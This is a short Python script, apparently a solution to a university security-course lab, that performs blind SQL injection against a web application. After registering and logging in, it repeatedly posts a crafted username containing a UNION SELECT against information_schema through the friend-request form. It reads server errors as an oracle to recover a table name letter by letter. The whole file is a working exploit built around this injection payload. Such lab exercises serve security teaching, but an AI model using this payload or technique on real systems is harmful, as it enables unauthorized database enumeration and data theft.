import requests
import string

login_data = {'username' : 'teste1', 'password' : 'teste1'}

URL = 'http://34ead85a967c3a29f1f3d306c40d31e50f45c0adc2ef24f9f20babfa4e40.project.ssof.rnl.tecnico.ulisboa.pt'

init_url = URL + '/init'
register_url = URL + '/register'
login_url = URL + '/login'
add_url = URL + '/request_friend'

table_name = 'U'

with requests.Session() as s:
	r = s.get(init_url)
	r = s.post(register_url, data = login_data)
	r = s.post(login_url, data = login_data)
	while True:	
		for next_letter in string.ascii_lowercase:
			payload = {'username' : "aaa' UNION SELECT 1,2,3,4,5 FROM information_schema.columns WHERE table_name LIKE '{}%'#".format(table_name+next_letter)}
			r = s.post(add_url, data = payload, proxies = {'http':'127.0.0.1:8080'})
			if(r.status_code == 500):
				table_name = table_name + next_letter
				print(table_name)
				break
		if(len(table_name) == 5):
			break

assert 'Users' in table_name
